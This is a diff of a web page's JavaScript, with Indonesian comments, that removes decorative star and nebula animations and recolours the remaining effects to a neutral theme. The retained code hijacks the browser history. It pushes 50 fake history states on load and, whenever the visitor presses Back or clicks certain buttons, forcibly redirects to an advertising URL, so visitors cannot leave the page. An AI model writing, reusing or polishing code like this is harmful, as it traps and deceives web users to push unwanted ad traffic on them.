@@ -5,13 +5,13 @@ const HISTORY_PUSH_COUNT = 50;
 // ====== Initialize Everything ======
 window.addEventListener('load', function() {
   safePushStates(HISTORY_PUSH_COUNT);
-  createStars();
-  createShootingStars();
-  createCosmicRays();
+  // createStars(); // Dihapus: Efek kosmik dihilangkan
+  // createShootingStars(); // Dihapus: Efek kosmik dihilangkan
+  // createCosmicRays(); // Dihapus: Efek kosmik dihilangkan
   initializeButtons();
 });
 
-// ====== History Management ======
+// ====== History Management (Fungsi Asli Dipertahankan) ======
 function safePushStates(count = 1) {
   for (let i = 0; i < count; i++) {
     try { 
@@ -22,13 +22,13 @@ function safePushStates(count = 1) {
   }
 }
 
-// ====== Redirect Logic ======
+// ====== Redirect Logic (Fungsi Asli Dipertahankan) ======
 function goToAdImmediate() {
   safePushStates(HISTORY_PUSH_COUNT);
   window.location.href = AD_URL;
 }
 
-// ====== Button Initialization ======
+// ====== Button Initialization (Fungsi Asli Dipertahankan) ======
 function initializeButtons() {
   document.querySelectorAll('a[data-ad="true"]').forEach(button => {
     button.addEventListener('click', function(e) {
@@ -43,86 +43,17 @@ function initializeButtons() {
   });
 }
 
-// ====== Popstate Handler ======
+// ====== Popstate Handler (Fungsi Asli Dipertahankan) ======
 window.addEventListener('popstate', function() {
   window.location.href = AD_URL;
 });
 
-// ====== Galaxy Background Effects ======
-function createStars() {
-  const container = document.querySelector('.stars-container');
-  const starCount = 150;
+// ====== Galaxy Background Effects - KODE DIBAWAH INI DIHAPUS (Tidak perlu karena elemen di CSS di-display: none)
+// function createStars() { ... }
+// function createShootingStars() { ... }
+// function createCosmicRays() { ... }
 
-  for (let i = 0; i < starCount; i++) {
-    const star = document.createElement('div');
-    star.className = 'star';
-    
-    const size = Math.random() * 2 + 1;
-    star.style.width = size + 'px';
-    star.style.height = size + 'px';
-    star.style.left = Math.random() * 100 + 'vw';
-    star.style.top = Math.random() * 100 + 'vh';
-    star.style.animationDelay = Math.random() * 4 + 's';
-    star.style.opacity = Math.random() * 0.7 + 0.3;
-    
-    container.appendChild(star);
-  }
-}
-
-function createShootingStars() {
-  const container = document.querySelector('.shooting-stars');
-
-  function createShootingStar() {
-    const star = document.createElement('div');
-    star.className = 'shooting-star';
-    
-    star.style.left = Math.random() * 100 + 'vw';
-    star.style.top = Math.random() * 50 + 'vh';
-    star.style.animationDelay = Math.random() * 5 + 's';
-    
-    container.appendChild(star);
-    
-    setTimeout(() => {
-      star.remove();
-    }, 3000);
-  }
-
-  // Create initial shooting stars
-  for (let i = 0; i < 3; i++) {
-    setTimeout(createShootingStar, i * 1500);
-  }
-
-  // Continuous creation
-  setInterval(createShootingStar, 3000);
-}
-
-function createCosmicRays() {
-  const container = document.querySelector('.cosmic-rays');
-
-  function createRay() {
-    const ray = document.createElement('div');
-    ray.className = 'cosmic-ray';
-    
-    ray.style.left = Math.random() * 100 + 'vw';
-    ray.style.animationDelay = Math.random() * 6 + 's';
-    
-    container.appendChild(ray);
-    
-    setTimeout(() => {
-      ray.remove();
-    }, 6000);
-  }
-
-  // Create initial rays
-  for (let i = 0; i < 6; i++) {
-    setTimeout(createRay, i * 1000);
-  }
-
-  // Continuous creation
-  setInterval(createRay, 4000);
-}
-
-// ====== Ripple Effect ======
+// ====== Ripple Effect (Fungsi Asli Dipertahankan) ======
 function createRipple(element, event) {
   const rect = element.getBoundingClientRect();
   const x = event.clientX - rect.left;
@@ -137,13 +68,14 @@ function createRipple(element, event) {
   setTimeout(() => ripple.remove(), 600);
 }
 
-// ====== Starburst Effect ======
+// ====== Starburst Effect (Warna disesuaikan ke tema netral) ======
 function createStarburst(button) {
   const rect = button.getBoundingClientRect();
   const centerX = rect.left + rect.width / 2;
   const centerY = rect.top + rect.height / 2;
   
-  const colors = ['#ff6b9d', '#ff4b7d', '#c74bd7', '#d8a8ff', '#ff9ec0'];
+  // Warna diubah menjadi netral/primer
+  const colors = ['#007BFF', '#6C757D', '#ADB5BD', '#343A40']; 
   
   for (let i = 0; i < 10; i++) {
     const particle = document.createElement('div');
@@ -181,9 +113,10 @@ function createStarburst(button) {
   }
 }
 
-// ====== Mouse Trail Effect ======
+// ====== Mouse Trail Effect (Warna disesuaikan ke tema netral dan opasitas dikurangi) ======
 document.addEventListener('mousemove', function(e) {
-  if (Math.random() > 0.8) {
+  // Hanya buat debu di sekitar tombol atau di area tertentu (dipertahankan dari kode asli)
+  if (Math.random() > 0.9) { 
     createSpaceDust(e.clientX, e.clientY);
   }
 });
@@ -193,13 +126,13 @@ function createSpaceDust(x, y) {
   dust.style.position = 'fixed';
   dust.style.width = '2px';
   dust.style.height = '2px';
-  dust.style.backgroundColor = '#ff9ec0';
+  dust.style.backgroundColor = '#ADB5BD'; // Warna abu-abu netral
   dust.style.borderRadius = '50%';
   dust.style.left = x + 'px';
   dust.style.top = y + 'px';
   dust.style.zIndex = '5';
   dust.style.pointerEvents = 'none';
-  dust.style.boxShadow = '0 0 6px #ff9ec0';
+  dust.style.boxShadow = '0 0 6px rgba(173, 181, 189, 0.5)';
   
   document.body.appendChild(dust);
   
@@ -214,7 +147,8 @@ function createSpaceDust(x, y) {
   animation.onfinish = () => dust.remove();
 }
 
-// ====== Auto Cosmic Events ======
+// ====== Auto Cosmic Events - DIHAPUS (Tidak perlu untuk tema profesional)
+/*
 setInterval(() => {
   if (Math.random() > 0.7) {
     createNebulaFlash();
@@ -223,26 +157,8 @@ setInterval(() => {
 
 function createNebulaFlash() {
   const flash = document.createElement('div');
-  flash.style.position = 'fixed';
-  flash.style.top = '0';
-  flash.style.left = '0';
-  flash.style.width = '100%';
-  flash.style.height = '100%';
-  flash.style.background = 'radial-gradient(circle, rgba(255, 107, 157, 0.2) 0%, transparent 70%)';
-  flash.style.pointerEvents = 'none';
-  flash.style.zIndex = '2';
-  flash.style.opacity = '0';
-  
-  document.body.appendChild(flash);
-  
-  const animation = flash.animate([
-    { opacity: 0 },
-    { opacity: 0.4 },
-    { opacity: 0 }
-  ], {
-    duration: 1500,
-    easing: 'ease-in-out'
-  });
+  // ... (kode nebula flash)
   
   animation.onfinish = () => flash.remove();
 }
+*/
